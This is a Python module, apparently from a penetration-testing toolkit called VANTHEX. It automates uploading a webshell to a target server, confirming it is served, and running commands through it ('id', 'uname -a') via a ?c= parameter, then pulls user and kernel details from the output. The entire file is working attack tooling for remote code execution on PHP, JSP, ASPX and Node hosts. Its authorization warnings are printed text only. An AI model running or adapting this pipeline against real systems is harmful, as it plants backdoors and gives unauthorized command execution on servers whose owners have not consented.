"""
SessKit v1 — exploit -> session pipeline for VANTHEX. OPERATOR-GATED.

Not a scan check: functions here WRITE to the target (upload a webshell) and
run execution probes. Requires written authorization; NEVER enters PROFILES.
Invoked by the operator via CLI:

    python3 sesskit.py --target http://t --upload /upload --name sh.php --lang php

Pipeline: deliver_webshell -> verify serving -> execution probe (id/uname,
read-only) -> session summary. Plain-return module, no dependency on
vulnscan2 (no circular imports), unit-testable with a client stub.
"""
import argparse
import json as _json
from urllib.parse import quote as _quote


def run_pipeline(client, upload_path, name, lang, marker="VHXWS",
                 cmd_runner=None):
    """Run the upload->verify->probe pipeline.

    Args:
        client: netclient.Client (or a stub with .post/.get)
        upload_path / name / lang: see exploitkit.deliver_webshell
        marker: engagement marker
        cmd_runner: callable(cmd)->str remote execution. Default: GET
            serve_url?c=<cmd> (classic webshell).

    Returns a report dict:
        {"status": "ok"|"fail", "stage": ..., "serve_url": ...,
         "exec": "verified"|"not-executed", "probe_out": ..., "enum": {...}}
    """
    import exploitkit as ek

    # 1) upload webshell + verify it is reachable again
    up = ek.deliver_webshell(client, upload_path, name, lang, marker=marker)
    if up.get("status") != "ok":
        return {"status": "fail", "stage": "upload", "detail": up}
    serve_url = up.get("serve_url") or ""

    # 2) verify the file is served
    r = client.get(serve_url)
    if not r or r.status != 200:
        return {"status": "fail", "stage": "verify", "serve_url": serve_url,
                "detail": f"serve_url not accessible (HTTP "
                          f"{getattr(r, 'status', '?')})"}

    # 3) read-only execution probe (id / uname -a) — the marker must be gone
    #    from the output; if the raw payload is echoed it is only served,
    #    not executed (result honesty: report "not-executed").
    runner = cmd_runner or (lambda cmd: (
        client.get(f"{serve_url}?c={_quote(cmd)}").body or ""))
    out_id = str(runner("id"))
    out_uname = str(runner("uname -a"))
    executed = (up.get("payload", "") not in out_id
                and out_id.strip() not in ("", "None"))
    report = {
        "status": "ok",
        "serve_url": serve_url,
        "marker": marker,
        "exec": "verified" if executed else "not-executed",
        "probe_out": (out_id + " | " + out_uname)[:300] if executed else "",
        "enum": _enum_lite(out_id, out_uname) if executed else {},
    }
    return report


def _enum_lite(out_id, out_uname):
    """Minimal enumeration from probe output (read-only, no new commands)."""
    import re
    uid = re.search(r"uid=\d+\(\w+\)", out_id or "")
    ker = re.search(r"Linux [^\s]+ \S+", out_uname or "")
    return {"uid": uid.group(0) if uid else "",
            "kernel": ker.group(0) if ker else ""}


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="SessKit — exploit->session pipeline (AUTHORIZATION REQUIRED)")
    ap.add_argument("--target", required=True)
    ap.add_argument("--upload", required=True, help="upload endpoint path")
    ap.add_argument("--name", required=True, help="webshell file name")
    ap.add_argument("--lang", required=True, choices=("php", "jsp", "aspx", "node"))
    ap.add_argument("--marker", default="VHXWS")
    ns = ap.parse_args(argv)

    from netclient import Client
    client = Client(ns.target)
    report = run_pipeline(client, ns.upload, ns.name, ns.lang, marker=ns.marker)
    print(_json.dumps(report, indent=2))
    print("\n[!] This pipeline WRITES to the target. Use only on assets "
          "you own / with written authorization.", file=__import__("sys").stderr)
    return 0 if report.get("status") == "ok" else 1


if __name__ == "__main__":
    raise SystemExit(main())
